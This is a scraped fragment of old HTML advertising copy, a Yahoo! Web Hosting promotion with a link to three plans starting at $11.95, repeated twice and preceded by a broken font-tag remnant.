face=arial=size=-1>Yahoo! Web Hosting has <a href="http://webhosting.yahoo.com/ps/wh/prod/">three affordable plans</a> to meet your needs - starting at just $11.95.
face=arial=size=-1>Yahoo! Web Hosting has <a href="http://webhosting.yahoo.com/ps/wh/prod/">three affordable plans</a> to meet your needs - starting at just $11.95.
